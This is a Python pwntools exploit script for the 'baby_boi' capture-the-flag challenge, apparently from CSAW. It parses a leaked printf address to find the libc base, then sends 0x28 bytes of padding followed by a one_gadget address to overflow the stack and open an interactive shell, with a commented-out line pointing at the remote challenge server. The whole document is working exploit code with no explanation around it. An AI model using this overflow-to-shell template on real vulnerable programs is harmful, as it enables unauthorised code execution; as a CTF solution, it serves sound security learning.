# libc 2.27

from pwn import *

libc = ELF('./libc.so.6')

r = process('./baby_boi')
#r = remote('pwn.chal.csaw.io', 1005)
r.recvuntil(': ')

libc_base = int(r.recvn(14), 16)-libc.symbols['printf']
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[0]
print "libc_base @ ", hex(libc_base)
print "one_shot @ ", hex(one_shot)
payload = 'a'*0x28 + p64(one_shot)

r.sendline(payload)

r.interactive()
